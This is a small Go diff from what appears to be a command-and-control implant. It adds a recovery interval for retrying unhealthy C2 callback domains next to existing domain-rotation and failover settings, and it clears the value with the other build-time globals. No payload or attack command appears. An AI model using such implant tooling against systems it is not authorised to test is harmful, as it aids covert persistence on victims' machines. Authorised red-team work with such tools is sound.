@@ -54,6 +54,7 @@ var (
 	httpxDomains           string = "" // Comma-separated httpx callback domains
 	httpxRotation          string = "" // httpx domain rotation: fail-over, round-robin, random
 	httpxFailoverThreshold string = "" // httpx failover threshold (consecutive failures before switching)
+	recoveryInterval       string = "" // Seconds between recovery attempts for unhealthy C2 domains (default: 600)
 )
 
 // clearGlobals zeros out ALL build-time global variables after they have been
@@ -89,6 +90,7 @@ func clearGlobals() {
 	httpxDomains = ""
 	httpxRotation = ""
 	httpxFailoverThreshold = ""
+	recoveryInterval = ""
 
 	// Operational parameters
 	sleepInterval = ""
